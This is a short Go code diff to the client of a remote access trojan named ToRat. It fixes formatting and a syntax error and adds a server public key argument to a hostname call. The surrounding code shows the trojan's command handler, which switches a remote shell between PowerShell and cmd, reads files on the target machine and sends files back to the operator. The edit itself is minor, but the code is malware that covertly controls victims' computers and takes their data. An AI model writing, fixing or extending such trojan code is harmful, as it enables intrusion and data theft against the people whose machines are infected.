@@ -8,10 +8,10 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/lu4p/cat"
 	"github.com/lu4p/ToRat_client/crypto"
 	"github.com/lu4p/ToRat_client/screen"
 	"github.com/lu4p/ToRat_client/shred"
+	"github.com/lu4p/cat"
 )
 
 func ls(path string) string {
@@ -38,17 +38,17 @@ func (c *connection) shell() {
 
 		switch cmdsp[0] {
 		case "powershell":
-			if runtime.GOOS == "windows"{
+			if runtime.GOOS == "windows" {
 				powershell = true
 				output = []byte("Shell is now Powershell")
 			}
 		case "cmd":
-			if runtime.GOOS == "windows"{
+			if runtime.GOOS == "windows" {
 				powershell = false
 				output = []byte("Shell is now Cmd")
 			}
 		case "hostname":
-			output = crypto.GetHostname(HostnamePath)
+			output = crypto.GetHostname(HostnamePath, ServerPubKey)
 		case "down":
 			out = false
 			c.sendFile(cmdsp[1])
@@ -73,7 +73,7 @@ func (c *connection) shell() {
 		case "ping":
 			output = []byte("pong")
 		case "cat":
-			txt, err := cat.Cat(cmdsp[1]))
+			txt, err := cat.Cat(cmdsp[1])
 			if err != nil {
 				ouput = "Something went wrong could not get txt!"
 			} else {
